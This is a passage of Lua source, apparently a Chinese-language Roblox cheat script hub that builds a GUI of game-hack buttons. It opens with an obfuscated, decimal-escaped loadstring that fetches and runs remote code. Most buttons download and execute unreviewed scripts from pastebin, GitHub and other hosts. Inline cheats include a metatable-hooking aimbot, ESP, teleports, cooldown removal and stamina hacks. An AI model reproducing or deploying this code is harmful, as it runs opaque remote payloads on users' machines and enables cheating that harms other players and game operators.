loadstring("\13\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\71\101\116\79\98\106\101\99\116\115\40\34\114\98\120\97\115\115\101\116\105\100\58\47\47\55\50\53\55\55\54\49\55\56\53\34\41\91\49\93\46\83\111\117\114\99\101\41\40\41\13\10")()

wait(0)
game.StarterGui:SetCore("SendNotification", {
Title = "âœ…!";
Text = "Net Bypass Activated.";
})
end)

UICorner_5.Parent = Function4

Function5.Name = "Function5"
Function5.Parent = ScrollingFrame
Function5.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function5.Position = UDim2.new(0.0397513807, 0, 0.376493812, 0)
Function5.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function5.Font = Enum.Font.SourceSans
Function5.Text = "敬请期待" -- 5
Function5.TextColor3 = Color3.fromRGB(0, 0, 0)
Function5.TextSize = 14.000
Function5.MouseButton1Down:Connect(function()
  --Loadstring here
end)

UICorner_6.Parent = Function5

Function6.Name = "Function6"
Function6.Parent = ScrollingFrame
Function6.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function6.Position = UDim2.new(0.0397513807, 0, 0.466294974, 0)
Function6.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function6.Font = Enum.Font.SourceSans
Function6.Text = "敬请期待" --6
Function6.TextColor3 = Color3.fromRGB(0, 0, 0)
Function6.TextSize = 14.000
Function6.MouseButton1Down:Connect(function()
  --Loadstring here
end)

UICorner_7.Parent = Function6

Function7.Name = "敬请期待"
Function7.Parent = ScrollingFrame
Function7.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function7.Position = UDim2.new(0.0397513807, 0, 0.556096137, 0)
Function7.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function7.Font = Enum.Font.SourceSans
Function7.Text = "敬请期待"--7
Function7.TextColor3 = Color3.fromRGB(0, 0, 0)
Function7.TextSize = 14.000
Function7.MouseButton1Down:Connect(function()
  --Loadstring here
end)

UICorner_8.Parent = Function7

Function8.Name = "Function8"
Function8.Parent = ScrollingFrame
Function8.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function8.Position = UDim2.new(0.0397513807, 0, 0.644293666, 0)
Function8.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function8.Font = Enum.Font.SourceSans
Function8.Text = "敬请期待" --8
Function8.TextColor3 = Color3.fromRGB(0, 0, 0)
Function8.TextSize = 14.000
Function8.MouseButton1Down:Connect(function()
  --Loadstring here
end)

UICorner_9.Parent = Function8

Function9.Name = "Function9"
Function9.Parent = ScrollingFrame
Function9.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function9.Position = UDim2.new(0.0397513807, 0, 0.734094799, 0)
Function9.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function9.Font = Enum.Font.SourceSans
Function9.Text = "敬请期待" --9
Function9.TextColor3 = Color3.fromRGB(0, 0, 0)
Function9.TextSize = 14.000
Function9.MouseButton1Down:Connect(function()
  --Loadstring here
end)

UICorner_10.Parent = Function9

Function10.Name = "Function10"
Function10.Parent = ScrollingFrame
Function10.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function10.Position = UDim2.new(0.0397513807, 0, 0.823895931, 0)
Function10.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function10.Font = Enum.Font.SourceSans
Function10.Text = "敬请期待" --10
Function10.TextColor3 = Color3.fromRGB(0, 0, 0)
Function10.TextSize = 14.000
Function10.MouseButton1Down:Connect(function()
  --Loadstring here
end)

UICorner_11.Parent = Function10

CredsDontRemove.Name = "CredsDontRemove" --dont remove or change the credits from the template
CredsDontRemove.Parent = KrewTempOpen
CredsDontRemove.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CredsDontRemove.BackgroundTransparency = 1.000
CredsDontRemove.Position = UDim2.new(0.311960489, 0, 0.16607289, 0)
CredsDontRemove.Size = UDim2.new(0.392178982, 0, 0.0609364994, 0)
CredsDontRemove.Font = Enum.Font.SourceSans
CredsDontRemove.Text = "鲨. 汉化组 群号:719247153 " --dont change this (leave my credits)
CredsDontRemove.TextColor3 = Color3.fromRGB(120, 120, 120)
CredsDontRemove.TextSize = 14.000

Close.Name = "Close"
Close.Parent = KrewTempOpen
Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Close.BackgroundTransparency = 1.000
Close.Position = UDim2.new(0.909142137, 0, 0.00320718414, 0)
Close.Size = UDim2.new(0.0908579305, 0, 0.0801796019, 0)
Close.Font = Enum.Font.SourceSans
Close.Text = "X" -- change if u dont want questionmarks
Close.TextColor3 = Color3.fromRGB(255, 255, 255)
Close.TextSize = 14.000

TempByKrew.Name = "TempBy$Krew"
TempByKrew.Parent = KrewTemplate
TempByKrew.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TempByKrew.Position = UDim2.new(0.567761779, 0, 0.979447246, 0)
TempByKrew.Size = UDim2.new(0.214157432, 0, 0.0168804135, 0)
TempByKrew.Visible = false

TextButton.Parent = TempByKrew
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Size = UDim2.new(0.935741007, 0, 0.96325624, 0)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "    â–º" -- change if u dont want questionmarks
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 14.000
TextButton.TextXAlignment = Enum.TextXAlignment.Left

-- Scripts (dont touch):

local function EEYCAWA_fake_script() -- Close.Script 
	local script = Instance.new('Script', Close)

	local frame = script.Parent.Parent.Parent["$KrewTempOpen"]
	
	
	
	script.Parent.MouseButton1Click:Connect(function()
		if frame.Visible == true then
			frame.Visible = false
			frame.Parent["TempBy$Krew"].Visible = true
		end
	end)
end
coroutine.wrap(EEYCAWA_fake_script)()
local function VLRJSU_fake_script() -- KrewTempOpen.LocalScript 
	local script = Instance.new('LocalScript', KrewTempOpen)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
end

game.StarterGui:SetCore("SendNotification",  {
 Title = "Script is made by G.A.X.P";
 Text = "discord.gg/JPTv7JkG8g";
 Icon = ""; -- dont touch this, if u want to add ur own notification just do this:
 Duration = 5;
})

coroutine.wrap(VLRJSU_fake_script)()
local function RKEF_fake_script() -- TextButton.Script 
	local script = Instance.new('Script', TextButton)

	local frame = script.Parent.Parent.Parent["$KrewTempOpen"]
	
	script.Parent.MouseButton1Click:Connect(function()
		if frame.Visible == false then
			frame.Visible = true
			script.Parent.Parent.Parent["TempBy$Krew"].Visible = false
		end
	end)
end
coroutine.wrap(RKEF_fake_script)()
local function XSRGC_fake_script() -- TempByKrew.LocalScript 
	local script = Instance.new('LocalScript', TempByKrew)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
end
coroutine.wrap(XSRGC_fake_script)()
end)


Button = Page:CreateButton("伐木大亨2", "复杂版", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/frencaliber/LuaWareLoader.lw/main/luawareloader.wtf",true))()
end)

Button = Page:CreateButton("伐木大亨2", "简单版", function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/NOOBARMYSCRIPTER/NOOBARMYSCRIPTER/main/AXE%20LOOP%20SCRIPT"), true))()
end)

Button = Page:CreateButton("DOORS", "自动更新", function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/R8QMbhzv')))()
end)


local Page = Tab:CreateFrame("脚本集合♴♴")

Button = Page:CreateButton("餐厅大亨2", "玩家快速做菜厨师快速做菜自动领钱", function()
    local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()
local w = library:CreateWindow("餐厅大亨2汉化版")
local b = w:CreateFolder("主页")
b:Button("玩家快速烹饪",function()
    local Cooking = game.Players.LocalPlayer.PlayerScripts.CookingNew
local CookProgress = require(Cooking.CookProgress)
local MultiClick = require(Cooking.InputDetectors.MultiClick)
local MouseMovement = require(Cooking.InputDetectors.MouseMovement)
local MouseSpin = require(Cooking.InputDetectors.MouseSpin)

local run = CookProgress.run
CookProgress.run = function(...)
  local ARGS = {...}
  ARGS[3] = 0
  return run(unpack(ARGS))
end

MultiClick.start = function(...)
  ({...})[3]()
end

MouseMovement.start = function(...)
  ({...})[3]()
end

MouseSpin.start = function(...)
  ({...})[3]()
end
end)
b:Button("一键收钱",function()
    warn("Requiring API")do
  loadstring(game:HttpGet("https://pastebin.com/raw/KMc6aBky"))();
end warn("API Loaded")

local child = object.child
local descendant = object.descendant
local check = object.check

local Tycoon = game.Players.LocalPlayer.Tycoon.Value
descendant.foreach(Tycoon.Items.OftenFiltered.Surface,"Bill",function(Bill)
  local Settings = {
          ["name"] = "CollectBill",
          ["model"] = Bill.Parent
  }
 
  game.ReplicatedStorage.Events.ClientTycoonInput:FireServer(Tycoon,Settings)
end)

local Connection,Code = descendant.on_add(Tycoon.Items.OftenFiltered.Surface,function(Bill)
  check.it(Bill.Name == "Bill",function()
      local Settings = {
              ["name"] = "CollectBill",
              ["model"] = Bill.Parent
      }
     
      game.ReplicatedStorage.Events.ClientTycoonInput:FireServer(Tycoon,Settings)
  end)
end)
end)
b:Button("npc自动烹饪",function()
    local chiefInstantCook = true
local npcReach = true

local Client = game.Players.LocalPlayer
local PS = Client.PlayerScripts
local Module = require(PS.ClientMain.Replications.Workers.WalkDummy)
local Worker = require(PS.CookingNew.WorkerComponents.WorkerDefault)
local M1 = require(PS.ClientMain.Replications.Customers.GetNPCFolder)



if npcReach then
   hookfunction(Module,function()
       return task.wait()
   end)
end

if chiefInstantCook then
   Worker.event = function(...)
      local args = {...}
      local npc = M1.GetNPCFolder(args[1]).ClientWorkers:FindFirstChild(args[2])
      local M2 = game.ReplicatedStorage.MiscModules.CookingSharedCharacter:FindFirstChild(args[4])
      if M2 then
          require(M2).finishInteract(npc,args[3],args[4])
      end
      return
   end
end
end)
end)

Button = Page:CreateButton("微笑感染", "碰人就抓解锁全武器", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/InfectiousSmile.lua", true))()
end)

Button = Page:CreateButton("入侵者", "杀死伟人和玩家", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/FGjjwm6W"))()
end)

Button = Page:CreateButton("破坏谜团透视", "可看谁是警长和杀手和平民", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/MurderMystery2HighlightESP"))(' Watermelon ?')
end)

Button = Page:CreateButton("3008", "不怎么好用", function()
    loadstring(game:HttpGet'https://raw.githubusercontent.com/RunDTM/scripts/main/3008.lua')()
end)

Button = Page:CreateButton("彩虹朋友", "一键通关", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/BorkWare/main/Scripts/' .. game.GameId .. ".lua"))(' Watermelon ? ')
end)

Button = Page:CreateButton("模仿者2", "一键通关", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ttjy9808/obfloadstringmainmimic/main/README.md", true))()
end)


local Page = Tab:CreateFrame("脚本♵♵♵")

Button = Page:CreateButton("战争模拟器", "必须电脑不然点不了", function()
    loadstring(game:HttpGet("https://script.vestra.tech"))()
end)

Button = Page:CreateButton("基地奇兵", "子弹追踪离你比较近的玩家", function()
    local Camera = game:GetService("Workspace").CurrentCamera
local Players = game:GetService("Players")
local LocalPlayer = game:GetService("Players").LocalPlayer

local function GetClosestPlayer()
   local ClosestPlayer = nil
   local FarthestDistance = math.huge

   for i, v in pairs(Players.GetPlayers(Players)) do
       if v ~= LocalPlayer and v.Character and v.Character.FindFirstChild(v.Character, "HumanoidRootPart") then
           local DistanceFromPlayer = (LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude

           if DistanceFromPlayer < FarthestDistance then
               FarthestDistance = DistanceFromPlayer
               ClosestPlayer = v
           end
       end
   end

   if ClosestPlayer then
       return ClosestPlayer
   end
end

local GameMetaTable = getrawmetatable(game)
local OldGameMetaTableNamecall = GameMetaTable.__namecall
setreadonly(GameMetaTable, false)

GameMetaTable.__namecall = newcclosure(function(object, ...)
   local NamecallMethod = getnamecallmethod()
   local Arguments = {...}

   if tostring(NamecallMethod) == "FindPartOnRayWithIgnoreList" then
       local ClosestPlayer = GetClosestPlayer()
       
       if ClosestPlayer and ClosestPlayer.Character then
           Arguments[1] = Ray.new(Camera.CFrame.Position, (ClosestPlayer.Character.Head.Position - Camera.CFrame.Position).Unit * (Camera.CFrame.Position - ClosestPlayer.Character.Head.Position).Magnitude)
       end
   end

   return OldGameMetaTableNamecall(object, unpack(Arguments))
end)

setreadonly(GameMetaTable, true)
end)


Button = Page:CreateButton("当前无法使用", "部分功能无法使用", function()
    loadstring(game:HttpGet('https://paste.website/p/96d68817-3f1e-4fef-a8b8-9aafdc810329.txt'))()
end)

Button = Page:CreateButton("狼与猎人", "加载慢", function()
    loadstring(game:HttpGet("https://paste.ee/r/NuSeu", true))()
end)

Button = Page:CreateButton("速度传奇", "自动重生", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/tnRF5xKt",true))()
end)

Button = Page:CreateButton("力量传奇", "英语", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Muscle-Legends'),true))()
end)

Button = Page:CreateButton("在披萨店工作", "获得免费老板", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/incognitototo/sda/main/dwa.lua", true))()
end)


Button = Page:CreateButton("逃离设施", "在商店的下方", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LeviTheOtaku/roblox-scripts/main/FTFHAX.lua",true))()

end)

Button = Page:CreateButton("中世纪游戏", "无限体力", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/memejames/New/main/Hub'))()
end)

local Page = Tab:CreateFrame("超人力一路向西")


Button = Page:CreateButton("需要加入Na1Xi群组", "在游戏里搜", function()
    
end)
Button = Page:CreateButton("超级枪", "无限子弹超快射速", function()
    loadstring(game:GetObjects("rbxassetid://10040701935")[1].Source)()
end)

Button = Page:CreateButton("当前无法使用", "", function()
    loadstring(game:GetObjects("rbxassetid://10040722920")[1].Source)()
end)

Button = Page:CreateButton("快速抢劫", "死亡后失效", function()
    loadstring(game:GetObjects("rbxassetid://10041726588")[1].Source)()
end)

Button = Page:CreateButton("防摔", "死亡后失效", function()
    loadstring(game:GetObjects("rbxassetid://10040712770")[1].Source)()
end)

Button = Page:CreateButton("防套", "不知道干嘛用的", function()
    loadstring(game:GetObjects("rbxassetid://10040719318")[1].Source)()
end)


Button = Page:CreateButton("透视", "", function()
    loadstring(game:GetObjects("rbxassetid://10092697033")[1].Source)()
end)

local Page = Tab:CreateFrame("脚本集合♶♶♶♶")

Button = Page:CreateButton("逃脱", "自动重生", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Evade"))()
end)

Button = Page:CreateButton("鱿鱼游戏", "电脑才能用", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SpongeRep/Spong3/main/SQG"))()
end)

local Page = Tab:CreateFrame("自然灾害")

Button = Page:CreateButton("自然灾害", "获得气球", function()
    plyr = game.Players.LocalPlayer char = plyr.Character torso = char.Torso mouse = plyr:GetMouse() Run = game:service'RunService' deb = game:service'Debris' ra = char["Right Arm"] la = char["Left Arm"] rs = char.Torso["Right Shoulder"] ls = char.Torso["Left Shoulder"] local platform = false local idle = true iliketrains = {} part1 = Instance.new("Part", char) part1.FormFactor = "Symmetric" part1.Size = Vector3.new(1, 3, 1) part1.TopSurface = 0 part1.BottomSurface = 0 part1:BreakJoints() special = Instance.new("SpecialMesh", part1) special.MeshId = "http://www.roblox.com/asset/?id=25498565" special.TextureId = "http://www.roblox.com/asset/?id=26725707" special.Scale = Vector3.new(2, 2, 2) w = Instance.new("Weld", char) w.Part0 = part1 w.Part1 = torso w.C0 = CFrame.new(-0.4, -1.4, -0.5) * CFrame.Angles(-0.5, 0, 0.2) part2 = Instance.new("Part", char) part2.FormFactor = "Symmetric" part2.Size = Vector3.new(1, 3, 1) part2.TopSurface = 0 part2.BottomSurface = 0 part2:BreakJoints() special2 = Instance.new("SpecialMesh", part2) special2.MeshId = "http://www.roblox.com/asset/?id=25498565" special2.TextureId = "http://www.roblox.com/asset/?id=26725707" special2.Scale = Vector3.new(2, 2, 2) w2 = Instance.new("Weld", char) w2.Part0 = part2 w2.Part1 = torso w2.C0 = CFrame.new(0.4, -1.4, -0.5) * CFrame.Angles(-0.5, 0, -0.2) tool = Instance.new("HopperBin", plyr.Backpack) tool.Name = " " tool.TextureId = "http://www.roblox.com/asset/?id=27471616" tool.Selected:connect(function(mouse) mouse.Button1Down:connect(function(mouse) if equipped then return end equipped = true coroutine.wrap(function() while equipped do rs.DesiredAngle = 0 rs.CurrentAngle = 0 ls.DesiredAngle = 0 ls.CurrentAngle = 0 Run.Stepped:wait() end end)() coroutine.wrap(function() idle = false coroutine.wrap(function() for i = 0, 3 do w.C0 = w.C0 * CFrame.new(0, 0.05, 0) w2.C0 = w2.C0 * CFrame.new(0, 0.05, 0) Run.Stepped:wait() end wait(0.147) for i = 0, 3 do w.C0 = w.C0 * CFrame.new(0, -0.05, 0) w2.C0 = w2.C0 * CFrame.new(0, -0.05, 0) Run.Stepped:wait() end end)() local p = Instance.new("Part", char) p.FormFactor = "Custom" p.Name = "Platform" p.Transparency = 1 p.Size = Vector3.new(4, 1, 4) p.Anchored = true for i = 2.5, 6, 0.05 do p.CFrame = CFrame.new(torso.CFrame.x, torso.CFrame.y-i, torso.CFrame.z) Run.Stepped:wait() end coroutine.wrap(function() p:Destroy() end)() end)() for i = 0, 4 do ls.C0 = ls.C0 * CFrame.Angles(-0.25, 0, 0) rs.C0 = rs.C0 * CFrame.Angles(-0.25, 0, 0) Run.Stepped:wait() end wait(0.02) for i = 0, 4 do ls.C0 = ls.C0 * CFrame.Angles(0.25, 0, 0) rs.C0 = rs.C0 * CFrame.Angles(0.25, 0, 0) Run.Stepped:wait() end idle = true equipped = false end) end) while idle do for i = 0, 3 do w.C0 = w.C0 * CFrame.Angles(0, 0.002 * i, 0) w2.C0 = w2.C0 * CFrame.Angles(0, -0.002 * i, 0) Run.Stepped:wait() end wait(0.112687) for i = 0, 3 do w.C0 = w.C0 * CFrame.Angles(0, -0.002 * i, 0) w2.C0 = w2.C0 * CFrame.Angles(0, 0.002 * i, 0) Run.Stepped:wait() end wait(0.312687) end
end)

Button = Page:CreateButton("工具包", "拆墙包", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()
end)


local Page = Tab:CreateFrame("战争大亨")

Button = Page:CreateButton("自瞄", "", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/1Gp9c57U"))()
end)

Button = Page:CreateButton("透视", "", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/OwlHub.txt"))()
end)

Button = Page:CreateButton("回家", "", function()
    game:GetService("Players").LocalPlayer.Character:MoveTo(workspace.Tycoon.Tycoons[game:GetService("Players").LocalPlayer.leaderstats.Team.Value].Essentials.Spawn.Position)
end)

Button = Page:CreateButton("传送旗帜", "", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(73.22032928466797, 47.9999885559082, 191.06993103027344)
end)

Button = Page:CreateButton("油桶1", "", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-9.748652458190918, 48.662540435791016, 700.2245483398438)
end)

Button = Page:CreateButton("油桶2", "", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(76.48243713378906, 105.25657653808594, -2062.3896484375)
end)

Button = Page:CreateButton("油桶3", "", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(69.48390197753906, 105.25657653808594, 3434.9033203125)
end)

Button = Page:CreateButton("温馨提示不要开很快的移动速度会封", "×∇×", function()
    if MapUI == false then game.Players.LocalPlayer.PlayerGui.MainGui.MapVotePage.Visible = false end if MapUI == true then game.Players.LocalPlayer.PlayerGui.MainGui.MapVotePage.Visible = true end
end)

local Page = Tab:CreateFrame("感染的微笑")

Button = Page:CreateButton("无cd棒球棒", "好", function()
    game.Players.LocalPlayer.Character.Bat.Cooldown.Value = 0
end)

Button = Page:CreateButton("无cd玻璃瓶", "好", function()
    game.Players.LocalPlayer.Character.Bottle.Cooldown.Value = 0
end)

Button = Page:CreateButton("无cd武士刀", "好", function()
    game.Players.LocalPlayer.Character.Katana.Cooldown.Value = 0
end)

Button = Page:CreateButton("无cd木棒", "好", function()
    game.Players.LocalPlayer.Character.Branch.Cooldown.Value = 0
end)

Button = Page:CreateButton("自动拿玻璃杯", "有Bug", function()
    game:GetService("CoreGui").PurchasePrompt.Enabled = false
_G.Lag = true
while _G.Lag do
for i,v in pairs(workspace:GetDescendants()) do
   if v:IsA("ClickDetector") then
    fireclickdetector(v)
   end
end
  wait(1)
  end
end)

Button = Page:CreateButton("删除白块", "好玩!", function()
    for _,v in pairs(game.workspace:GetDescendants()) do

if string.find(v.Name,"Infector") then
v:Destroy()
end
end
end)

Button = Page:CreateButton("范围打击", "木头玻璃有效", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/XTeziEAP",true))()
end)

Button = Page:CreateButton("隔山打牛", "木头玻璃", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/g0kC5mjs"))()
end)


local Page = Tab:CreateFrame("战斗战士")

Button = Page:CreateButton("自动盾反", "别人拿武器直接反不好用", function()
local lp = game.Players.LocalPlayer

local animationInfo = {}

function getInfo(id)
  local success, info = pcall(function()
      return game:GetService("MarketplaceService"):GetProductInfo(id)
  end)
  if success then
      return info
  end
  return {Name=''}
end
function block(player)
  keypress(0x46)
  wait()
  keyrelease(0x46)
end

local AnimNames = {
  'Slash',
  'Swing',
  'Sword'
}

function playerAdded(v)
    local function charadded(char)
      local humanoid = char:WaitForChild("Humanoid", 5)
      if humanoid then
          humanoid.AnimationPlayed:Connect(function(track)
              local info = animationInfo[track.Animation.AnimationId]
              if not info then
                  info = getInfo(tonumber(track.Animation.AnimationId:match("%d+")))
                  animationInfo[track.Animation.AnimationId] = info
              end
             
              if (lp.Character and lp.Character:FindFirstChild("Head") and v.Character:FindFirstChild("Head")) then
                  local mag = (v.Character.Head.Position - lp.Character.Head.Position).Magnitude
                  if mag < 15  then
                     
                      for _, animName in pairs(AnimNames) do
                          if info.Name:match(animName) then
                              pcall(block, v)
                          end
                      end
                     
                  end
              end
          end)
      end
  end
 
  if v.Character then
      charadded(v.Character)
  end
  v.CharacterAdded:Connect(charadded)
end

for i,v in pairs(game.Players:GetPlayers()) do
   if v ~= lp then
       playerAdded(v)
   end
end

game.Players.PlayerAdded:Connect(playerAdded)
end)

Button = Page:CreateButton("跳跃无间隔、无限耐力、水下呼吸", "很好用很推荐👍", function()
for i,v in pairs(getgc(true)) do
   if typeof(v) == "table" and rawget(v, "getIsMaxed") then
       v.getIsMaxed = function()
           return false
       end
       v.getFlags = function()
           return 1
       end
       v.addFlags = function(a,b)
           a:setFlags(0)
           return
       end
   end
   -- "There was another script here but it caused the user to crash (lag out), so it had to be removed" -KiwisASkid --
   if typeof(v) == "table" and rawget(v, "spawnCharacter") then
       local oldfunc = v.spawnCharacter
       v.SpawnCharacter = function(a)
           for _,f in pairs(getgc(true)) do
               if typeof(f) == "table" and rawget(f, "getIsMaxed") then
                   f.getIsMaxed = function()
                       return false
                   end
                   f.getFlags = function()
                       return 1
                   end
                   f.addFlags = function(aa,b)
                       aa:setFlags(0)
                       return
                   end
               end
           end
       end
   end
   if typeof(v) == "table" and rawget(v, "getCanJump") then
       v.getCanJump = function()
           return true
       end
   end
   if typeof(v) == "table" and rawget(v, "JUMP_DELAY_ADD") then
       v.JUMP_DELAY_ADD = 0.5
   end
   if typeof(v) == "table" and rawget(v, "_setStamina") then
       v._setStamina = function(a, b)
           a._stamina = math.huge
           a._staminaChangedSignal:Fire(99)
       end
   end
end
game.StarterGui:SetCore("SendNotification", {Title = "CB", Text = "Script loaded, "..game.Players.LocalPlayer.DisplayName..".", Duration = 4,})
end)

local Page = Tab:CreateFrame("等待小凌更新.谢谢")
